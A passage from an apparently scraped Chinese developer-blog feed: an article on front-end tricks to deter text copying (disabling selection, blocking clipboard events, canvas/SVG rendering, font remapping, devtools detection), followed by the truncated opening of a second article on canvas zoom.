<p>因为用户还是可以通过开发者工具，截图提取文字等等这些方式来进行复制。不过我们也可以在一定程度上提升复制的门槛，防止普通用户随意复制。</p>
<hr/>
<p>以下是几种常用方案：</p>
<h3 data-id="heading-0">1. <strong>禁用文本选择</strong></h3>
<p>使用 CSS 禁止用户选中文本：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span> {
  -webkit-user-select: none; <span class="hljs-comment">/* Safari */</span>
  -moz-user-select: none;    <span class="hljs-comment">/* Firefox */</span>
  -ms-user-select: none;     <span class="hljs-comment">/* IE/Edge */</span>
  user-select: none;         <span class="hljs-comment">/* 标准语法 */</span>
}
</code></pre>
<p>也可以针对特定元素设置：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>这段文字无法被选中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>用户仍可查看源代码或使用其他手段复制。</p>
<hr/>
<h3 data-id="heading-1">2. <strong>监听并阻止复制、剪切、粘贴事件</strong></h3>
<p>通过 JavaScript 拦截相关键盘和剪贴板事件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'copy'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'复制已被禁止'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'cut'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'剪切已被禁止'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'paste'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'粘贴已被禁止'</span>);
});
</code></pre>
<p>用户还是可以按下F12禁用 JavaScript 或绕过事件监听。</p>
<hr/>
<h3 data-id="heading-2">3. <strong>将内容嵌入图片或 Canvas</strong></h3>
<p>将关键内容渲染为图片或使用 <code>&lt;canvas&gt;</code> 绘制，使文本不可直接选中：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"text-as-image.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"不可复制的文字"</span>&gt;</span>
</code></pre>
<p>或使用 canvas 动态绘制：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myCanvas"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> ctx = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'myCanvas'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'20px Arial'</span>;
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'这段文字无法复制'</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>不利于 SEO、无障碍访问（屏幕阅读器无法读取），且加载慢。</p>
<hr/>
<h3 data-id="heading-3">4.用户按F12就出发debug功能</h3>
<p>当用户按下F12时，触发debug调试，让用户无法选中页面内容。</p>
<pre><code class="hljs language-js" lang="js">&lt;script&gt;
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">antiDebug</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> devOpen = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> threshold = <span class="hljs-number">100</span>;

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">debugger</span>;
    <span class="hljs-keyword">const</span> end = performance.<span class="hljs-title function_">now</span>();

    <span class="hljs-keyword">if</span> (end - start &gt; threshold) {
      <span class="hljs-keyword">if</span> (!devOpen) {
        devOpen = <span class="hljs-literal">true</span>;
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;h2&gt;检测到开发者工具，请关闭后重试。&lt;/h2&gt;'</span>;
        <span class="hljs-comment">// 可选：上报用户行为</span>
        <span class="hljs-comment">// fetch('/log-devtools', { method: 'POST' });</span>
      }
    } <span class="hljs-keyword">else</span> {
      devOpen = <span class="hljs-literal">false</span>;
    }

    <span class="hljs-built_in">setTimeout</span>(check, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-title function_">check</span>();
})();
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-4">5. 动态文本拆分与重组</h3>
<p>将文本内容拆分成多个DOM节点，增加复制难度：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"protected-text"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 文本将被JavaScript拆分并插入 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> text = <span class="hljs-string">"这是一段需要保护的机密内容，不能被轻易复制"</span>;
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-text'</span>);
  
  <span class="hljs-comment">// 将每个字符用span包裹</span>
  text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
    span.<span class="hljs-property">textContent</span> = char;
    span.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline-block'</span>; <span class="hljs-comment">// 增加选择难度</span>
    container.<span class="hljs-title function_">appendChild</span>(span);
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>进阶版</strong>：随机插入不可见字符或零宽字符：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">obfuscateText</span>(<span class="hljs-params">text</span>) {
  <span class="hljs-keyword">const</span> zeroWidthSpace = <span class="hljs-string">'\u200B'</span>; <span class="hljs-comment">// 零宽空格</span>
  <span class="hljs-keyword">return</span> text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> 
    char + zeroWidthSpace.<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3</span>))
  ).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
}

<span class="hljs-keyword">const</span> originalText = <span class="hljs-string">"保护内容"</span>;
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'text'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">obfuscateText</span>(originalText);
</code></pre>
<hr/>
<h3 data-id="heading-5">6. 使用CSS伪元素显示内容</h3>
<p>通过CSS的<code>::before</code>或<code>::after</code>伪元素显示文本：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.protected-content</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"这段文字通过CSS生成，无法直接选中和复制"</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"protected-content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">7. 字体反爬虫技术</h3>
<p>使用自定义字体文件，将字符映射关系打乱：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@font-face</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'custom-font.woff2'</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">'woff2'</span>);
}

<span class="hljs-selector-class">.protected-text</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
}
</code></pre>
<p>在字体文件中，将实际字符与显示字符的映射关系打乱，比如：</p>
<ul>
<li>字符<code>a</code>在字体中实际显示为<code>b</code></li>
<li>字符<code>b</code>显示为<code>c</code>，以此类推</li>
</ul>
<p><strong>后端配合</strong>：服务器动态生成字体文件，定期更换映射关系。</p>
<hr/>
<h3 data-id="heading-7">8.  Canvas + WebGL 渲染文本</h3>
<p>使用更复杂的图形渲染技术：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"textCanvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"800"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'textCanvas'</span>);
  <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  
  <span class="hljs-comment">// 设置文字样式</span>
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'24px Arial'</span>;
  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#333'</span>;
  
  <span class="hljs-comment">// 绘制干扰元素</span>
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'保护内容'</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>);
  
  <span class="hljs-comment">// 添加噪声干扰</span>
  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    ctx.<span class="hljs-title function_">fillRect</span>(
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">800</span>, 
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>, 
      <span class="hljs-number">1</span>, <span class="hljs-number">1</span>
    );
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">9. SVG 文本渲染</h3>
<p>使用SVG渲染文本，增加选择难度：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"30"</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"Arial"</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">"20"</span> 
        <span class="hljs-attr">fill</span>=<span class="hljs-string">"black"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>
    这段SVG文本难以复制
  <span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 添加干扰路径 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M10,40 L390,40"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"#eee"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"1"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-9">10. 实时DOM监控与修复</h3>
<p>监控DOM变化，防止用户通过开发者工具修改内容：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> contentElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-content'</span>);
<span class="hljs-keyword">const</span> originalContent = contentElement.<span class="hljs-property">innerHTML</span>;

<span class="hljs-comment">// 定时检查内容完整性</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (contentElement.<span class="hljs-property">innerHTML</span> !== originalContent) {
    contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'检测到内容篡改，已恢复'</span>);
  }
}, <span class="hljs-number">500</span>);

<span class="hljs-comment">// 使用MutationObserver更精确的监控</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
  mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mutation</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'childList'</span> || mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'characterData'</span>) {
      contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    }
  });
});

observer.<span class="hljs-title function_">observe</span>(contentElement, {
  <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">characterData</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<hr/>
<h3 data-id="heading-10">综合防御策略建议</h3>
<p>对于高安全要求的场景，建议采用<strong>分层防御</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContentProtector</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">disableSelection</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startMonitoring</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">obfuscateContent</span>();
  }
  
  <span class="hljs-title function_">disableSelection</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">insertAdjacentHTML</span>(<span class="hljs-string">'beforeend'</span>, <span class="hljs-string">`
      &lt;style&gt;
        body { -webkit-user-select: none; user-select: none; }
        .protected { cursor: default; }
      &lt;/style&gt;
    `</span>);
  }
  
  <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 绑定所有阻止事件</span>
    [<span class="hljs-string">'copy'</span>, <span class="hljs-string">'cut'</span>, <span class="hljs-string">'paste'</span>, <span class="hljs-string">'contextmenu'</span>, <span class="hljs-string">'keydown'</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(event, <span class="hljs-variable language_">this</span>.<span class="hljs-property">preventDefault</span>);
    });
  }
  
  <span class="hljs-title function_">preventDefault</span>(<span class="hljs-params">e</span>) {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-title function_">startMonitoring</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 启动各种监控</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDevTools</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDOMChanges</span>();
  }
  
  <span class="hljs-title function_">obfuscateContent</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 内容混淆处理</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDevTools</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 开发者工具检测</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDOMChanges</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// DOM变化监控</span>
    <span class="hljs-comment">// ...</span>
  }
}

<span class="hljs-comment">// 初始化保护</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentProtector</span>();
</code></pre>
<hr/>
<h3 data-id="heading-11">总结</h3>
<p>这些方法只能防普通用户，防不住真正想复制的人。</p>
<p>因为别人还是可以通过看源码、截图、关掉 JS 等方式绕过限制。</p>
<p>所以建议：</p>
<ul>
<li><strong>别过度防护</strong>，以免影响正常用户和 SEO；</li>
<li><strong>重要内容靠后端控制</strong>（比如登录才能看全文）；</li>
<li><strong>组合使用几种方法</strong>，提高门槛就好，别追求绝对安全。</li>
</ul>
<p>毕竟前端展示的内容，就默认是能被看到的，也就能被复制的。</p>
<blockquote>
<p>本文首发于公众号：程序员刘大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-12">📌往期精彩</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6V83qjR6u0nyfzL-14xYAw" target="_blank" title="https://mp.weixin.qq.com/s/6V83qjR6u0nyfzL-14xYAw" ref="nofollow noopener noreferrer">《async/await 到底要不要加 try-catch？异步错误处理最佳实践》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FIvdZqX7sR8DAZE8B5R5eTQ" target="_blank" title="https://mp.weixin.qq.com/s/IvdZqX7sR8DAZE8B5R5eTQ" ref="nofollow noopener noreferrer">《都在用 Java8 和 Java17，那 Java9 到 16 呢？他们真的没用吗？》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fp0n2mN5RDDDaIWuHHVRUZQ" target="_blank" title="https://mp.weixin.qq.com/s/p0n2mN5RDDDaIWuHHVRUZQ" ref="nofollow noopener noreferrer">《Java 开发必看：什么时候用 for，什么时候用 Stream？》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqI3TRTdDfRJSH9kCTqAQUw" target="_blank" title="https://mp.weixin.qq.com/s/qI3TRTdDfRJSH9kCTqAQUw" ref="nofollow noopener noreferrer">《这 10 个 MySQL 高级用法，让你的代码又快又好看》</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Virtual World 005】上帝之眼]]></title>    <link>https://juejin.cn/post/7581761825482489892</link>    <guid>https://juejin.cn/post/7581761825482489892</guid>    <pubDate>2025-12-10T02:54:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581761825482489892" data-draft-id="7577971299743580198" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Virtual World 005】上帝之眼"/> <meta itemprop="keywords" content="前端,JavaScript,HTML"/> <meta itemprop="datePublished" content="2025-12-10T02:54:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大怪v"/> <meta itemprop="url" content="https://juejin.cn/user/4391901700043284"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Virtual World 005】上帝之眼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4391901700043284/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大怪v
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:54:19.000Z" title="Wed Dec 10 2025 02:54:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这是<strong>纯前端手搓虚拟世界</strong>第五篇。</p>
<h2 data-id="heading-0">高瞻远瞩</h2>
<p>前端佬们，上一篇我们基本实现了“一个无限空间”的<code>canvas</code>，好虽然是好，但这种方式，你的视野被锁死了。这就好比你在看地图时，却被禁用了“缩放”功能一样。</p>
<p>这完全丧失了那种高瞻远瞩的感觉。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29505254560d43508a0470cb57d61a09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940058&amp;x-signature=7aOiJb8WAOcdORvI7NtzRwiCqUg%3D" alt="image.png" loading="lazy"/></p>
<p>本篇要给加这套逻辑，核心交互是：<strong>鼠标滚轮滚动时，以鼠标当前位置为中心，进行放大或缩小。</strong></p>
<p>别小看这个“以鼠标为中心”，很多初学者写出来的缩放，一滚轮下去，画面直接飞到九霄云外去了（通常是缩放到 (0,0) 原点去了）。我们的目标，是丝般顺滑的专业级缩放。</p>
<hr/>
<h2 data-id="heading-1">战略思考</h2>
<p>还是老规矩，怎么去实现这玩意呢？？</p>
<p>应该有前端佬的第一想法，是canvas的缩放 <code>scale</code> 功能。</p>
<p>bingo！！优秀如你！</p>
<p>就是它。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e7245e7df0f4dbd8076ddfabc97d6ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940058&amp;x-signature=D2%2FTtk2xaSy2C2%2BXpkFr7%2BrjOLs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">战术规划</h2>
<ul>
<li>
<p><strong>第一步：数学原理修正</strong>。引入缩放（Scale）后，屏幕上的 100px 可能只代表世界里的 50px（放大 2 倍）。之前的公式要改。</p>
</li>
<li>
<p><strong>第二步：实现“定点缩放”</strong> 。</p>
<ul>
<li>原理：在缩放发生<strong>前</strong>，记下鼠标指向的世界坐标 <code>P1</code>。</li>
<li>执行缩放（改变 <code>zoom</code> 值）。</li>
